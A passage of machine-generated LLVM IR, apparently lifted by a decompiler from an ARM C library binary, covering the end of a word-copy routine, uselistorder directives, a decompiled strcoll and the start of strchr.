  store i32 %v12_1840c, i32* %v11_1840c, align 4
  store i32 %v1_1840c, i32* %r0.global-to-local, align 4
  %v0_18410 = load i32, i32* %r2.global-to-local, align 4
  %v2_18410 = add i32 %v0_18410, -16
  store i32 %v2_18410, i32* %r2.global-to-local, align 4
  %v6_18414 = icmp slt i32 %v0_18410, 16
  br i1 %v6_18414, label %dec_label_pc_18418, label %dec_label_pc_183e8.dec_label_pc_183e8_crit_edge

dec_label_pc_183e8.dec_label_pc_183e8_crit_edge:  ; preds = %dec_label_pc_183e8
  %v0_183e8.pre = load i32, i32* @r3, align 4
  %v0_183ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_18418:                               ; preds = %dec_label_pc_183e8
  %v2_18418 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18418, i32* @r4, align 4
  %v5_18418 = load i8*, i8** %stack_var_-8, align 4
  %v6_18418 = ptrtoint i8* %v5_18418 to i32
  store i32 %v6_18418, i32* @r5, align 4
  store i32 %v11_183e4, i32* @lr, align 4
  %v2_1841c = add i32 %v0_18410, -4
  store i32 %v2_1841c, i32* %r2.global-to-local, align 4
  %v4_1841c = add i32 %v0_18410, 2147483632
  %v5_1841c = and i32 %v2_1841c, %v4_1841c
  %v6_1841c = icmp slt i32 %v5_1841c, 0
  store i1 %v6_1841c, i1* %cpsr_v.global-to-local, align 1
  %v7_1841c = icmp slt i32 %v2_1841c, 0
  store i1 %v7_1841c, i1* %cpsr_n.global-to-local, align 1
  %v8_1841c = icmp eq i32 %v2_1841c, 0
  store i1 %v8_1841c, i1* %cpsr_z.global-to-local, align 1
  %v5_18420 = icmp slt i32 %v2_18410, -12
  br i1 %v5_18420, label %dec_label_pc_1843c, label %dec_label_pc_18424

dec_label_pc_18424:                               ; preds = %dec_label_pc_18418, %dec_label_pc_183d8, %dec_label_pc_18424
  %v1_18430 = phi i32 [ %v5_18430, %dec_label_pc_18424 ], [ %v1_1840c, %dec_label_pc_18418 ], [ %v0_183a019, %dec_label_pc_183d8 ]
  %v0_18424 = load i32, i32* @r3, align 4
  %v3_18424 = mul i32 %v0_18424, 65536
  store i32 %v3_18424, i32* %ip.global-to-local, align 4
  %v0_18428 = load i32, i32* %r1.global-to-local, align 4
  %v1_18428 = add i32 %v0_18428, -4
  %v2_18428 = inttoptr i32 %v1_18428 to i32*
  %v3_18428 = load i32, i32* %v2_18428, align 4
  store i32 %v3_18428, i32* @r3, align 4
  store i32 %v1_18428, i32* %r1.global-to-local, align 4
  %v4_1842c = udiv i32 %v3_18428, 65536
  %v5_1842c = or i32 %v4_1842c, %v3_18424
  store i32 %v5_1842c, i32* @ip, align 4
  %v2_18430 = add i32 %v1_18430, -4
  %v3_18430 = inttoptr i32 %v2_18430 to i32*
  store i32 %v5_1842c, i32* %v3_18430, align 4
  %v4_18430 = load i32, i32* %r0.global-to-local, align 4
  %v5_18430 = add i32 %v4_18430, -4
  store i32 %v5_18430, i32* %r0.global-to-local, align 4
  %v0_18434 = load i32, i32* %r2.global-to-local, align 4
  %v2_18434 = add i32 %v0_18434, -4
  store i32 %v2_18434, i32* %r2.global-to-local, align 4
  %v6_18438 = icmp slt i32 %v0_18434, 4
  br i1 %v6_18438, label %dec_label_pc_1843c.loopexit, label %dec_label_pc_18424

dec_label_pc_1843c.loopexit:                      ; preds = %dec_label_pc_18424
  %v4_18434 = sub i32 3, %v0_18434
  %v5_18434 = and i32 %v4_18434, %v0_18434
  %v6_18434 = icmp slt i32 %v5_18434, 0
  %v7_18434 = icmp slt i32 %v2_18434, 0
  store i1 %v6_18434, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18434, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1843c

dec_label_pc_1843c:                               ; preds = %dec_label_pc_1843c.loopexit, %dec_label_pc_18418
  %v2_1831452 = phi i32 [ %v5_18430, %dec_label_pc_1843c.loopexit ], [ %v1_1840c, %dec_label_pc_18418 ]
  %v0_1830448 = phi i32 [ %v2_18434, %dec_label_pc_1843c.loopexit ], [ %v2_1841c, %dec_label_pc_18418 ]
  %v0_1843c = load i32, i32* %r1.global-to-local, align 4
  %v1_1843c = add i32 %v0_1843c, 2
  store i32 %v1_1843c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_18444:                               ; preds = %dec_label_pc_18358
  br i1 %v5_18448, label %dec_label_pc_18490, label %dec_label_pc_1844c

dec_label_pc_1844c:                               ; preds = %dec_label_pc_18444
  store i32 %v2_18444, i32* %r2.global-to-local, align 4
  %v3_18450 = load i32, i32* @r4, align 4
  store i32 %v3_18450, i32* %stack_var_-12, align 4
  %v6_18450 = load i32, i32* @r5, align 4
  %v8_18450 = inttoptr i32 %v6_18450 to i8*
  store i8* %v8_18450, i8** %stack_var_-8, align 4
  %v11_18450 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18454

dec_label_pc_18454:                               ; preds = %dec_label_pc_18454.dec_label_pc_18454_crit_edge, %dec_label_pc_1844c
  %v0_18478 = phi i32 [ %v1_18478, %dec_label_pc_18454.dec_label_pc_18454_crit_edge ], [ %v0_183a019, %dec_label_pc_1844c ]
  %v0_18458 = phi i32 [ %v0_18458.pre, %dec_label_pc_18454.dec_label_pc_18454_crit_edge ], [ %v1_18358, %dec_label_pc_1844c ]
  %v0_18454 = phi i32 [ %v0_18454.pre, %dec_label_pc_18454.dec_label_pc_18454_crit_edge ], [ %v2_1835c, %dec_label_pc_1844c ]
  %v3_18454 = mul i32 %v0_18454, 16777216
  store i32 %v3_18454, i32* %lr.global-to-local, align 4
  %v1_18458 = add i32 %v0_18458, -4
  %v2_18458 = inttoptr i32 %v1_18458 to i32*
  %v3_18458 = load i32, i32* %v2_18458, align 4
  store i32 %v3_18458, i32* @r3, align 4
  %v4_18458 = add i32 %v0_18458, -8
  %v5_18458 = inttoptr i32 %v4_18458 to i32*
  %v6_18458 = load i32, i32* %v5_18458, align 4
  store i32 %v6_18458, i32* %r4.global-to-local, align 4
  %v7_18458 = add i32 %v0_18458, -12
  %v8_18458 = inttoptr i32 %v7_18458 to i32*
  %v9_18458 = load i32, i32* %v8_18458, align 4
  store i32 %v9_18458, i32* %r5.global-to-local, align 4
  %v10_18458 = add i32 %v0_18458, -16
  %v11_18458 = inttoptr i32 %v10_18458 to i32*
  %v12_18458 = load i32, i32* %v11_18458, align 4
  store i32 %v10_18458, i32* %r1.global-to-local, align 4
  %v4_1845c = udiv i32 %v12_18458, 256
  %v5_1845c = or i32 %v4_1845c, %v3_18454
  store i32 %v5_1845c, i32* %lr.global-to-local, align 4
  %v3_18460 = mul i32 %v12_18458, 16777216
  %v4_18464 = udiv i32 %v9_18458, 256
  %v5_18464 = or i32 %v3_18460, %v4_18464
  store i32 %v5_18464, i32* @ip, align 4
  %v3_18468 = mul i32 %v9_18458, 16777216
  %v4_1846c = udiv i32 %v6_18458, 256
  %v5_1846c = or i32 %v3_18468, %v4_1846c
  store i32 %v5_1846c, i32* %r5.global-to-local, align 4
  %v3_18470 = mul i32 %v6_18458, 16777216
  %v4_18474 = udiv i32 %v3_18458, 256
  %v5_18474 = or i32 %v3_18470, %v4_18474
  store i32 %v5_18474, i32* %r4.global-to-local, align 4
  %v1_18478 = add i32 %v0_18478, -16
  %v2_18478 = inttoptr i32 %v1_18478 to i32*
  store i32 %v5_18474, i32* %v2_18478, align 4
  %v4_18478 = add i32 %v0_18478, -12
  %v5_18478 = inttoptr i32 %v4_18478 to i32*
  %v6_18478 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18478, i32* %v5_18478, align 4
  %v7_18478 = add i32 %v0_18478, -8
  %v8_18478 = inttoptr i32 %v7_18478 to i32*
  %v9_18478 = load i32, i32* @ip, align 4
  store i32 %v9_18478, i32* %v8_18478, align 4
  %v10_18478 = add i32 %v0_18478, -4
  %v11_18478 = inttoptr i32 %v10_18478 to i32*
  %v12_18478 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18478, i32* %v11_18478, align 4
  store i32 %v1_18478, i32* %r0.global-to-local, align 4
  %v0_1847c = load i32, i32* %r2.global-to-local, align 4
  %v2_1847c = add i32 %v0_1847c, -16
  store i32 %v2_1847c, i32* %r2.global-to-local, align 4
  %v6_18480 = icmp slt i32 %v0_1847c, 16
  br i1 %v6_18480, label %dec_label_pc_18484, label %dec_label_pc_18454.dec_label_pc_18454_crit_edge

dec_label_pc_18454.dec_label_pc_18454_crit_edge:  ; preds = %dec_label_pc_18454
  %v0_18454.pre = load i32, i32* @r3, align 4
  %v0_18458.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18454

dec_label_pc_18484:                               ; preds = %dec_label_pc_18454
  %v2_18484 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18484, i32* @r4, align 4
  %v5_18484 = load i8*, i8** %stack_var_-8, align 4
  %v6_18484 = ptrtoint i8* %v5_18484 to i32
  store i32 %v6_18484, i32* @r5, align 4
  store i32 %v11_18450, i32* @lr, align 4
  %v2_18488 = add i32 %v0_1847c, -4
  store i32 %v2_18488, i32* %r2.global-to-local, align 4
  %v4_18488 = add i32 %v0_1847c, 2147483632
  %v5_18488 = and i32 %v2_18488, %v4_18488
  %v6_18488 = icmp slt i32 %v5_18488, 0
  store i1 %v6_18488, i1* %cpsr_v.global-to-local, align 1
  %v7_18488 = icmp slt i32 %v2_18488, 0
  store i1 %v7_18488, i1* %cpsr_n.global-to-local, align 1
  %v8_18488 = icmp eq i32 %v2_18488, 0
  store i1 %v8_18488, i1* %cpsr_z.global-to-local, align 1
  %v5_1848c = icmp slt i32 %v2_1847c, -12
  br i1 %v5_1848c, label %dec_label_pc_184a8, label %dec_label_pc_18490

dec_label_pc_18490:                               ; preds = %dec_label_pc_18484, %dec_label_pc_18444, %dec_label_pc_18490
  %v1_1849c = phi i32 [ %v5_1849c, %dec_label_pc_18490 ], [ %v1_18478, %dec_label_pc_18484 ], [ %v0_183a019, %dec_label_pc_18444 ]
  %v0_18490 = load i32, i32* @r3, align 4
  %v3_18490 = mul i32 %v0_18490, 16777216
  store i32 %v3_18490, i32* %ip.global-to-local, align 4
  %v0_18494 = load i32, i32* %r1.global-to-local, align 4
  %v1_18494 = add i32 %v0_18494, -4
  %v2_18494 = inttoptr i32 %v1_18494 to i32*
  %v3_18494 = load i32, i32* %v2_18494, align 4
  store i32 %v3_18494, i32* @r3, align 4
  store i32 %v1_18494, i32* %r1.global-to-local, align 4
  %v4_18498 = udiv i32 %v3_18494, 256
  %v5_18498 = or i32 %v4_18498, %v3_18490
  store i32 %v5_18498, i32* @ip, align 4
  %v2_1849c = add i32 %v1_1849c, -4
  %v3_1849c = inttoptr i32 %v2_1849c to i32*
  store i32 %v5_18498, i32* %v3_1849c, align 4
  %v4_1849c = load i32, i32* %r0.global-to-local, align 4
  %v5_1849c = add i32 %v4_1849c, -4
  store i32 %v5_1849c, i32* %r0.global-to-local, align 4
  %v0_184a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_184a0 = add i32 %v0_184a0, -4
  store i32 %v2_184a0, i32* %r2.global-to-local, align 4
  %v6_184a4 = icmp slt i32 %v0_184a0, 4
  br i1 %v6_184a4, label %dec_label_pc_184a8.loopexit, label %dec_label_pc_18490

dec_label_pc_184a8.loopexit:                      ; preds = %dec_label_pc_18490
  %v4_184a0 = sub i32 3, %v0_184a0
  %v5_184a0 = and i32 %v4_184a0, %v0_184a0
  %v6_184a0 = icmp slt i32 %v5_184a0, 0
  %v7_184a0 = icmp slt i32 %v2_184a0, 0
  store i1 %v6_184a0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_184a0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_184a8

dec_label_pc_184a8:                               ; preds = %dec_label_pc_184a8.loopexit, %dec_label_pc_18484
  %v2_1831453 = phi i32 [ %v5_1849c, %dec_label_pc_184a8.loopexit ], [ %v1_18478, %dec_label_pc_18484 ]
  %v0_1830449 = phi i32 [ %v2_184a0, %dec_label_pc_184a8.loopexit ], [ %v2_18488, %dec_label_pc_18484 ]
  %v0_184a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_184a8 = add i32 %v0_184a8, 1
  store i32 %v1_184a8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1849c, { 0, 2, 1 }
  uselistorder i32 %v3_18490, { 1, 0 }
  uselistorder i32 %v2_18488, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18478, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18458, { 1, 0 }
  uselistorder i32 %v3_18454, { 1, 0 }
  uselistorder i32 %v0_18458, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18478, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18430, { 0, 2, 1 }
  uselistorder i32 %v3_18424, { 1, 0 }
  uselistorder i32 %v2_1841c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1840c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_183ec, { 1, 0 }
  uselistorder i32 %v3_183e8, { 1, 0 }
  uselistorder i32 %v0_183ec, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1840c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_183c4, { 0, 2, 1 }
  uselistorder i32 %v3_183b8, { 1, 0 }
  uselistorder i32 %v2_183b0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_183a0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18380, { 1, 0 }
  uselistorder i32 %v3_1837c, { 1, 0 }
  uselistorder i32 %v0_18380, { 3, 2, 1, 0 }
  uselistorder i32 %v0_183a0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_18448, { 2, 0, 1 }
  uselistorder i32 %v0_18360, { 1, 0 }
  uselistorder i32 %v0_1844c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_183a019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18350, { 2, 1, 0 }
  uselistorder i32 %v0_18350, { 2, 0, 1 }
  uselistorder i32 %v2_18348, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18348, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18348, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_183a020, { 2, 1, 0 }
  uselistorder i32 %v11_18324, { 1, 0 }
  uselistorder i32 %v7_18324, { 1, 0 }
  uselistorder i32 %v1_18304, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18304, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18308, { 1, 0 }
  uselistorder i32 %v7_182fc, { 0, 2, 1 }
  uselistorder i32 %v10_182f8, { 1, 0 }
  uselistorder i32 %v9_182f0, { 1, 0, 2 }
  uselistorder i32 %v6_182ec, { 1, 0 }
  uselistorder i32 %v2_182e4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_182e4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_182f4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_182d8, { 0, 2, 1 }
  uselistorder i32 %v13_182d4, { 1, 0 }
  uselistorder i32 %v4_182d0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_182d0, { 2, 0, 1 }
  uselistorder i32 %v6_182d8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_182c8, { 0, 2, 1 }
  uselistorder i32 %v16_182c4, { 1, 0 }
  uselistorder i32 %v4_182c0, { 1, 2, 0 }
  uselistorder i32 %v0_182d0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_182c8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_182b4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_182b0, { 1, 0 }
  uselistorder i32 %v1_182ac, { 1, 0 }
  uselistorder i32 %v10_182a8, { 1, 0 }
  uselistorder i32 %v0_182a8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_182ac, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_182a0, { 0, 2, 1 }
  uselistorder i32 %v2_18294, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18294, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_182ac37, { 1, 2, 0 }
  uselistorder i32 %v1_1828c, { 2, 1, 0 }
  uselistorder i32 %v1_18284, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1827c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18278, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18274, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18274, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_18264, { 0, 2, 1 }
  uselistorder i32 %v4_18260, { 1, 0 }
  uselistorder i32 %v3_18254, { 1, 0 }
  uselistorder i32 %v1_1824c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18240, { 1, 0 }
  uselistorder i32 %v12_1823c, { 0, 2, 1 }
  uselistorder i32 %v8_1821c, { 1, 0, 2 }
  uselistorder i32 %v5_1821c, { 1, 0, 2 }
  uselistorder i32 %v2_1821c, { 1, 0, 2 }
  uselistorder i32 %v0_1821c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1823c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_181f8, { 0, 2, 1 }
  uselistorder i32 %v4_181f4, { 1, 0 }
  uselistorder i32 %v3_181e8, { 1, 0 }
  uselistorder i32 %v1_181e0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_181d4, { 1, 0 }
  uselistorder i32 %v12_181d0, { 0, 2, 1 }
  uselistorder i32 %v8_181b0, { 1, 0, 2 }
  uselistorder i32 %v5_181b0, { 1, 0, 2 }
  uselistorder i32 %v2_181b0, { 1, 0, 2 }
  uselistorder i32 %v0_181b0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_181d0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1818c, { 0, 2, 1 }
  uselistorder i32 %v4_18188, { 1, 0 }
  uselistorder i32 %v3_1817c, { 1, 0 }
  uselistorder i32 %v1_18174, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18168, { 1, 0 }
  uselistorder i32 %v12_18164, { 0, 2, 1 }
  uselistorder i32 %v8_18144, { 1, 0, 2 }
  uselistorder i32 %v5_18144, { 1, 0, 2 }
  uselistorder i32 %v2_18144, { 1, 0, 2 }
  uselistorder i32 %v0_18144, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18164, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_181a0, { 0, 2, 1 }
  uselistorder i32 %v1_1819c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_18120, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18120, { 2, 0, 1, 3 }
  uselistorder i32 %v0_181a4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1823c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_18114, { 1, 0 }
  uselistorder i32 %v0_18114, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1810c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1810c, { 1, 0, 2 }
  uselistorder i32 %v0_1810c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1823c77, { 1, 0 }
  uselistorder i32 %v1_180ec, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_180f4, { 1, 0 }
  uselistorder i32 %v0_180c8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_180bc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_180a8, { 1, 0, 2 }
  uselistorder i32 %v1_180a4, { 1, 0 }
  uselistorder i32 %v1_1809c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1809c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18094, { 0, 2, 1 }
  uselistorder i32 %v3_18094, { 3, 0, 1, 2 }
  uselistorder i1 %v0_18094, { 1, 0 }
  uselistorder i1 %v1_18094, { 1, 0 }
  uselistorder i32 %v3_18090, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18088, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18074, { 1, 2, 0 }
  uselistorder i32 %v1_1806c, { 0, 2, 1 }
  uselistorder i32 %v12_18068, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1805c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18060, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_18050, { 0, 2, 1 }
  uselistorder i32 %v1_18048, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18048, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_18040, { 1, 0 }
  uselistorder i32 %v1_18038, { 2, 1, 0 }
  uselistorder i32 %v2_18030, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_18030, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1802c, { 1, 0 }
  uselistorder i32 %v2_18020, { 1, 0 }
  uselistorder i32 %v1_18020, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18020, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 44, 43, 55, 45, 46, 49, 47, 56, 48, 50, 52, 51, 57, 53, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 0, 9, 1, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 5, 26, 3, 27, 4, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 6, 7, 0, 9, 1, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 4, 24, 2, 25, 3, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 6, 7, 0, 9, 1, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 5, 22, 23, 24, 25, 26, 4, 27, 2, 28, 3, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 6, 5 }
  uselistorder i32 27, { 1, 0, 2, 6, 3, 7, 4, 8, 5, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 60, 61, 62, 6, 18, 19, 20, 63, 64, 65, 7, 21, 22, 23, 66, 67, 68, 8, 24, 25, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 73, 10, 33, 47, 48, 49, 9, 50, 51, 52, 34, 46, 2, 35, 40, 41, 42, 43, 44, 45, 0, 1, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_18490, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18424, { 2, 0, 1 }
  uselistorder label %dec_label_pc_183b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18358, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_182e4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_182a8, { 1, 0 }
  uselistorder label %dec_label_pc_18294, { 1, 0 }
  uselistorder label %dec_label_pc_18254, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1817c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1811c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_180ec, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_18088, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18048, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_184b4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_184b4 = phi i32 [ %v0_184b4.pre, %bb ], [ %v5_184b4, %bb3 ]
  %v0_184b0 = phi i32 [ %tmp, %bb ], [ %v5_184b0, %bb3 ]
  %v1_184b0 = inttoptr i32 %v0_184b0 to i8*
  %v2_184b0 = load i8, i8* %v1_184b0, align 1
  %v1_184b4 = inttoptr i32 %v0_184b4 to i8*
  %v2_184b4 = load i8, i8* %v1_184b4, align 1
  %v3_184b4 = zext i8 %v2_184b4 to i32
  %v2_184b8 = icmp eq i8 %v2_184b0, 0
  br i1 %v2_184b8, label %.dec_label_pc_184c4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_184b4 = add i32 %v0_184b4, 1
  %v5_184b0 = add i32 %v0_184b0, 1
  %v3_184b0 = zext i8 %v2_184b0 to i32
  %v10_184bc = icmp eq i8 %v2_184b0, %v2_184b4
  br i1 %v10_184bc, label %entry, label %dec_label_pc_184c4

.dec_label_pc_184c4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_184c4

dec_label_pc_184c4:                               ; preds = %bb3, %.dec_label_pc_184c4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_184c4_crit_edge ], [ %v3_184b0, %bb3 ]
  %v2_184c4.pre-phi = sub nsw i32 %.pn, %v3_184b4
  ret i32 %v2_184c4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_184b0, { 0, 2, 1 }
  uselistorder i32 %v0_184b0, { 1, 0 }
  uselistorder i32 %v0_184b4, { 1, 0 }
  uselistorder label %dec_label_pc_184c4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_18534 = urem i32 %arg1, 256
  %v0_185543 = load i32, i32* @r0, align 4
  %v1_185544 = urem i32 %v0_185543, 4
  %v2_185545 = icmp eq i32 %v1_185544, 0
  br i1 %v2_185545, label %dec_label_pc_1855c, label %dec_label_pc_1853c

dec_label_pc_1853c:                               ; preds = %entry, %dec_label_pc_18550
  %v0_18550 = phi i32 [ %v1_18550, %dec_label_pc_18550 ], [ %v0_185543, %entry ]
  %v1_1853c = inttoptr i32 %v0_18550 to i8*
  %v2_1853c = load i8, i8* %v1_1853c, align 1
  %v3_1853c = zext i8 %v2_1853c to i32
  %v9_18540 = icmp eq i32 %v3_1853c, %v1_18534
  br i1 %v9_18540, label %dec_label_pc_18610, label %dec_label_pc_18548

dec_label_pc_18548:                               ; preds = %dec_label_pc_1853c
  %v2_18548 = icmp eq i8 %v2_1853c, 0
  br i1 %v2_18548, label %dec_label_pc_1860c, label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %dec_label_pc_18548
  %v1_18550 = add i32 %v0_18550, 1
  %v1_18554 = urem i32 %v1_18550, 4
  %v2_18554 = icmp eq i32 %v1_18554, 0
  br i1 %v2_18554, label %dec_label_pc_1855c, label %dec_label_pc_1853c

